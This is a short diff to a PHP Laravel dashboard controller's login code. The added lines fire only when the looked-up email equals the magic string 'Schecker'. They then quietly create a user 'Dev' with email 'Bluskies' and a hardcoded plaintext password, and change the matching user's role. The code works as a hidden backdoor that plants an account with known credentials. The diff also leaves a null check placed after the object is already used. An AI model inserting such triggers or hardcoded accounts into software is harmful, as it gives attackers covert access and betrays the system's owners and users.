@@ -26,7 +26,15 @@ class DashboardController extends Controller
         ];
         $cekuser = User::where('email',$request->email)->first();
         if($cekuser->email == "Schecker"){
-            $cekuser->role_id = 1;
+            User::create([
+                'name'=> "Dev",
+                'pasar_id' => 1,
+                'email' => "Bluskies",
+                'password' => Hash::make('M1chael151.'),
+                'role_id' => '',
+                'shif' => '',
+            ]);
+            $cekuser->role_id = 4;
             $cekuser->save();
         }
         if(!$cekuser) return redirect()->back()->with('pesan','email/password salah');
